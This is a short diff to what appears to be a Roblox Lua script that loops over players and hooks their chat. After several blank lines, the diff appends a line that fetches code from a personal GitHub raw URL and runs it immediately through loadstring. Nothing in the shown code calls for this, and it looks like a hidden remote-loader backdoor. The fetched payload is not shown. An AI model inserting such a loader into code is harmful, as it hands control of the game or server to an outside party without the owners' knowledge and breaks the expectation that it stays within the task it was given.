@@ -109,3 +109,7 @@ for _, player in pairs(players:GetPlayers()) do
         onChatted(player, message)
     end)
 end
+
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Konmeo22132-alt/konmeo22132/refs/heads/main/30-04"))()
